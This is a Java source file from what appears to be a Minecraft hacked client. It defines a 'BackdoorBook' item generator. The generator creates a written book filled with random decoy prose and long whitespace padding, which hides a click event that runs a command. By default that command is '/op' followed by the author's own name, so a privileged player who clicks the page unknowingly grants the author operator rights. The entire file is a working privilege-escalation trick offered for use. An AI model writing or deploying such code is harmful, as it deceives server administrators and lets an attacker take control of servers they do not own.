/*
 * Copyright (c) Shadow client, Saturn5VFive and contributors 2022. All rights reserved.
 */

package coffee.client.feature.items.impl;

import coffee.client.CoffeeMain;
import coffee.client.feature.items.Item;
import coffee.client.feature.items.Option;
import coffee.client.helper.nbt.NbtGroup;
import coffee.client.helper.nbt.NbtList;
import coffee.client.helper.nbt.NbtProperty;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;

public class Backdoor extends Item {
    final Option<String> title = new Option<>("title", "generateForMe", String.class);
    final Option<String> content = new Option<>("content", "generateForMe", String.class);
    final Option<String> command = new Option<>("command", "generateForMe", String.class);
    final String[] nouns = new String[] { "bird", "clock", "boy", "plastic", "duck", "teacher", "old lady", "professor", "hamster", "dog" };
    final String[] verbs = new String[] { "kicked", "ran", "flew", "dodged", "sliced", "rolled", "died", "breathed", "slept", "killed" };
    final String[] adjectives = new String[] { "beautiful", "lazy", "professional", "lovely", "dumb", "rough", "soft", "hot", "vibrating", "slimy" };
    final String[] adverbs = new String[] { "slowly", "elegantly", "precisely", "quickly", "sadly", "humbly", "proudly", "shockingly", "calmly",
            "passionately" };
    final String[] preposition = new String[] { "down", "into", "up", "on", "upon", "below", "above", "through", "across", "towards" };

    public Backdoor() {
        super("BackdoorBook", "Makes a book that automatically runs a command when clicked viewed");
    }

    private static int random(int max) {
        return (int) Math.floor(Math.random() * max);
    }

    @Override
    public ItemStack generate() {
        String titleStr = title.getValue();
        String contentStr = content.getValue();
        String cmdStr = command.getValue();
        if (titleStr.equals("generateForMe")) {
            titleStr = getRandomTitle();
        }
        if (contentStr.equals("generateForMe")) {
            contentStr = getRandomContent();
        }
        String author = CoffeeMain.client.getSession().getProfile().getName();
        if (cmdStr.equals("generateForMe")) {
            cmdStr = "/op " + author;
        }
        NbtGroup ng = new NbtGroup(new NbtProperty("title", titleStr), new NbtProperty("author", author), new NbtList("pages",
                new NbtProperty("{\"text\": \"" + contentStr + " ".repeat(553) + "\",\"clickEvent\":{\"action\":\"run_command\",\"value\":\"" + cmdStr + "\"}}"),
                new NbtProperty("{\"text\":\"\"}"),
                new NbtProperty("{\"text\":\"\"}")
        ));
        ItemStack s = new ItemStack(Items.WRITTEN_BOOK);
        s.setNbt(ng.toCompound());
        return s;
    }

    String getRandomContent() {
        return "The " + adjectives[random(adjectives.length)] + " " + nouns[random(nouns.length)] + " " + adverbs[random(adverbs.length)] + " " + verbs[random(
                verbs.length)] + " because some " + nouns[random(nouns.length)] + " " + adverbs[random(adverbs.length)] + " " + verbs[random(verbs.length)] + " " + preposition[random(
                preposition.length)] + " a " + adjectives[random(adjectives.length)] + " " + nouns[random(nouns.length)] + " which, became a " + adjectives[random(
                adjectives.length)] + ", " + adjectives[random(adjectives.length)] + " " + nouns[random(nouns.length)] + ".";
    }

    String getRandomTitle() {
        return "The " + adjectives[random(adjectives.length)] + " tale of a " + nouns[random(nouns.length)];
    }
}
